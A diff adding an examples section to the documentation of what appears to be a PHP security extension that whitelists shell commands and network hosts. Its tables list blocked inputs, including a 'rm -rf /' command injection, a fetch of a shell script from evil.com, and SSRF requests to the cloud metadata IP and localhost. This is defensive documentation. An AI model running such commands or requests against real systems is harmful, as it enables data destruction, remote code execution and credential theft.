@@ -228,6 +228,36 @@ security_guard.log_format=jsonl
 
 ---
 
+### Practical Examples & Expected Results
+
+Below are some scenarios based on an example configuration.
+
+**Whitelist Configuration:**
+- Allowed commands: `/usr/bin/optipng`
+- Allowed networks: `api.mercadopago.com` (domain)
+
+#### Command Scenarios
+
+| PHP Code | Resulting Call | Expected Result | Reason for Block |
+|----------|----------------|-----------------|------------------|
+| `exec('optipng img.png');` | `optipng` (no absolute path) | ❌ **Blocked** | Path is not absolute or binary not in whitelist. |
+| `exec('/usr/bin/optipng img.png');` | `/usr/bin/optipng img.png` | ✅ **Allowed** | Binary is in whitelist and has no dangerous operators. |
+| `exec('/usr/bin/optipng img.png ; rm -rf /');` | `/usr/bin/optipng img.png ; rm -rf /` | ❌ **Blocked** | Dangerous operator (`;`) present. Prevents injection. |
+| `exec('/bin/bash payload.sh');` | `/bin/bash payload.sh` | ❌ **Blocked** | The `/bin/bash` binary is not explicitly authorized. |
+
+#### Network Scenarios
+
+| PHP Code | Resulting Call | Expected Result | Reason for Block |
+|----------|----------------|-----------------|------------------|
+| `file_get_contents('https://api.mercadopago.com/v1/');` | Domain `api.mercadopago.com` | ✅ **Allowed** | Domain is in the network whitelist. |
+| `curl_exec()` on `http://evil.com/shell.sh` | Domain `evil.com` | ❌ **Blocked** | Domain not listed in whitelist. |
+| `fopen('http://169.254.169.254/', 'r');` | IP `169.254.169.254` | ❌ **Blocked** | Cloud metadata IP blocked natively (SSRF protection). |
+| `file_get_contents('http://127.0.0.1/admin');` | IP `127.0.0.1` | ❌ **Blocked** | Private networks blocked natively (SSRF protection). |
+
+*(Note: When blocked in `block` mode, the function will return `false` or `null`, and a security `PHP Warning` will be emitted into the native PHP error logs).*
+
+---
+
 ### Enforcement Modes
 
 ```text
